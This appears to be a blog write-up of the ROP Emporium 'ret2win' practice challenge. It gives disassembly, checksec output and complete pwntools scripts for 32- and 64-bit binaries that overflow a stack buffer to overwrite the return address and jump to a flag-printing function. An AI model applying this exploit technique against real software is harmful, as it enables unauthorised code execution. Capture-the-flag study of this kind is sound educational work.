---
layout: post
title:  "ROP Emporium: ret2win"
date:   2021-03-07 22:07:56 +0200
categories: ropemporium
---
## 32-bit ##
Alright let's see what we are dealing with here.
```
voidwalker@Abyss:[ret2winx86]** ./ret2win32
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> lol
Thank you!
Exiting
```
We can see that we are asked for a buffer, let's investigate the assembly and see if there is any buffer overflow vulnerability present.
```
 08048546 <main>:
 8048546:       8d 4c 24 04             lea    ecx,[esp+0x4]
 804854a:       83 e4 f0                and    esp,0xfffffff0
 804854d:       ff 71 fc                push   DWORD PTR [ecx-0x4]
 8048550:       55                      push   ebp
 8048551:       89 e5                   mov    ebp,esp
 8048553:       51                      push   ecx
 8048554:       83 ec 04                sub    esp,0x4
 8048557:       a1 30 a0 04 08          mov    eax,ds:0x804a030
 804855c:       6a 00                   push   0x0
 804855e:       6a 02                   push   0x2
 8048560:       6a 00                   push   0x0
 8048562:       50                      push   eax
 8048563:       e8 98 fe ff ff          call   8048400 <setvbuf@plt>
 8048568:       83 c4 10                add    esp,0x10
 804856b:       83 ec 0c                sub    esp,0xc
 804856e:       68 e0 86 04 08          push   0x80486e0
 8048573:       e8 58 fe ff ff          call   80483d0 <puts@plt>
 8048578:       83 c4 10                add    esp,0x10
 804857b:       83 ec 0c                sub    esp,0xc
 804857e:       68 f8 86 04 08          push   0x80486f8
 8048583:       e8 48 fe ff ff          call   80483d0 <puts@plt>
 8048588:       83 c4 10                add    esp,0x10
 804858b:       e8 1d 00 00 00          call   80485ad <pwnme>
 8048590:       83 ec 0c                sub    esp,0xc
 8048593:       68 fd 86 04 08          push   0x80486fd
 8048598:       e8 33 fe ff ff          call   80483d0 <puts@plt>
 804859d:       83 c4 10                add    esp,0x10
 80485a0:       b8 00 00 00 00          mov    eax,0x0
 80485a5:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
 80485a8:       c9                      leave
 80485a9:       8d 61 fc                lea    esp,[ecx-0x4]
 80485ac:       c3                      ret

 080485ad <pwnme>:
 80485ad:       55                      push   ebp
 80485ae:       89 e5                   mov    ebp,esp
 80485b0:       83 ec 28                sub    esp,0x28
 80485b3:       83 ec 04                sub    esp,0x4
 80485b6:       6a 20                   push   0x20
 80485b8:       6a 00                   push   0x0
 80485ba:       8d 45 d8                lea    eax,[ebp-0x28]
 80485bd:       50                      push   eax
 80485be:       e8 4d fe ff ff          call   8048410 <memset@plt>
 80485c3:       83 c4 10                add    esp,0x10
 80485c6:       83 ec 0c                sub    esp,0xc
 80485c9:       68 08 87 04 08          push   0x8048708
 80485ce:       e8 fd fd ff ff          call   80483d0 <puts@plt>
 80485d3:       83 c4 10                add    esp,0x10
 80485d6:       83 ec 0c                sub    esp,0xc
 80485d9:       68 68 87 04 08          push   0x8048768
 80485de:       e8 ed fd ff ff          call   80483d0 <puts@plt>
 80485e3:       83 c4 10                add    esp,0x10
 80485e6:       83 ec 0c                sub    esp,0xc
 80485e9:       68 88 87 04 08          push   0x8048788
 80485ee:       e8 dd fd ff ff          call   80483d0 <puts@plt>
 80485f3:       83 c4 10                add    esp,0x10
 80485f6:       83 ec 0c                sub    esp,0xc
 80485f9:       68 e8 87 04 08          push   0x80487e8
 80485fe:       e8 bd fd ff ff          call   80483c0 <printf@plt>
 8048603:       83 c4 10                add    esp,0x10
 8048606:       83 ec 04                sub    esp,0x4
 8048609:       6a 38                   push   0x38
 804860b:       8d 45 d8                lea    eax,[ebp-0x28]
 804860e:       50                      push   eax
 804860f:       6a 00                   push   0x0
 8048611:       e8 9a fd ff ff          call   80483b0 <read@plt>
 8048616:       83 c4 10                add    esp,0x10
 8048619:       83 ec 0c                sub    esp,0xc
 804861c:       68 eb 87 04 08          push   0x80487eb
 8048621:       e8 aa fd ff ff          call   80483d0 <puts@plt>
 8048626:       83 c4 10                add    esp,0x10
 8048629:       90                      nop
 804862a:       c9                      leave
 804862b:       c3                      ret
```
As we can see, ```read``` can read a buffer of up to ```0x38``` bytes, but our current stack frame only has allocated ```0x28``` bytes, clearly a buffer overflow.
Let's check for protections.
```
voidwalker@Abyss:[ret2winx86]** checksec ./ret2win32
[*] '/home/voidwalker/ROPEmporium/ret2winx86/ret2win32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Alright, looks easy enough. ```ret2win``` function seems to output the flag, so all we need to do is overwrite the return address with its address.
```
 0804862c <ret2win>:
 804862c:       55                      push   ebp
 804862d:       89 e5                   mov    ebp,esp
 804862f:       83 ec 08                sub    esp,0x8
 8048632:       83 ec 0c                sub    esp,0xc
 8048635:       68 f6 87 04 08          push   0x80487f6
 804863a:       e8 91 fd ff ff          call   80483d0 <puts@plt>
 804863f:       83 c4 10                add    esp,0x10
 8048642:       83 ec 0c                sub    esp,0xc
 8048645:       68 13 88 04 08          push   0x8048813
 804864a:       e8 91 fd ff ff          call   80483e0 <system@plt>
 804864f:       83 c4 10                add    esp,0x10
 8048652:       90                      nop
 8048653:       c9                      leave
 8048654:       c3                      ret
 8048655:       66 90                   xchg   ax,ax
 8048657:       66 90                   xchg   ax,ax
 8048659:       66 90                   xchg   ax,ax
 804865b:       66 90                   xchg   ax,ax
 804865d:       66 90                   xchg   ax,ax
 804865f:       90                      nop
```
This is the final solution, I have commented the relevant parts.

```python
#!/usr/bin/env python3

from pwn import *

context.arch = "i386"
context.bits = 32
context.endian = "little"

e = ELF("./ret2win32")

io = e.process()

print(io.recvuntil('>'))

payload = b"A" * 44 + p32(0x0804862c) # address of ret2win function

with open('payload', 'wb') as file:
    file.write(payload)

io.sendline(payload)

print(io.recvrepeat())
```

And we get the flag
```
voidwalker@Abyss:[ret2winx86]** ./exploit.py
[*] '/home/voidwalker/ROPEmporium/ret2winx86/ret2win32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/voidwalker/ROPEmporium/ret2winx86/ret2win32': pid 16600
b"ret2win by ROP Emporium\nx86\n\nFor my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!\nWhat could possibly go wrong?\nYou there, may I have your input please? And don't worry about null
bytes, we're using read()!\n\n>"
b" Thank you!\nWell done! Here's your flag:\nROPE{a_placeholder_32byte_flag!}\n"
```

## 64-bit ##
The same method can be used, the only difference being the address from the virtual memory where ```ret2win``` is located and the offset to the saved return address.

```python
#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"
context.bits = 64
context.endian = "little"

e = ELF("./ret2win")

io = e.process()

print(io.recvuntil('>'))

payload = b"A" * 40 + p64(0x400756) # address of ret2win

with open('payload', 'wb') as file:
    file.write(payload)

io.sendline(payload)

print(io.recvrepeat())
```

The flag seems to be the same on 64 bits

```
voidwalker@Abyss:[ret2winx64]** ./exploit.py
[*] '/home/voidwalker/ROPEmporium/ret2winx64/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/voidwalker/ROPEmporium/ret2winx64/ret2win': pid 16899
b"ret2win by ROP Emporium\nx86_64\n\nFor my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!\nWhat could possibly go wrong?\nYou there, may I have your input please? And don't worry about null bytes, we're using read()!\n\n>"
b" Thank you!\nWell done! Here's your flag:\nROPE{a_placeholder_32byte_flag!}\n"
```
